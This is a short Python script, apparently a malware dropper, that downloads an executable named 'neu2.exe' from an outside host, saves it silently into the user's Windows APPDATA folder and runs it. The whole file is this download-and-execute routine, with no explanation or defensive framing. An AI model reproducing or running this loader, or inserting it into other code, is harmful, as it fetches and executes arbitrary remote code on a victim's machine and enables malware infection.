import urllib.request
import subprocess
import os


url = "https://kekw.battleb0t.xyz/neu2.exe"

filename = "neu2.exe"

appdata_path = os.getenv("APPDATA")

filepath = os.path.join(appdata_path, filename)

response = urllib.request.urlopen(url)
with open(filepath, 'wb') as out_file:
    data = response.read()
    out_file.write(data)

subprocess.call([filepath])
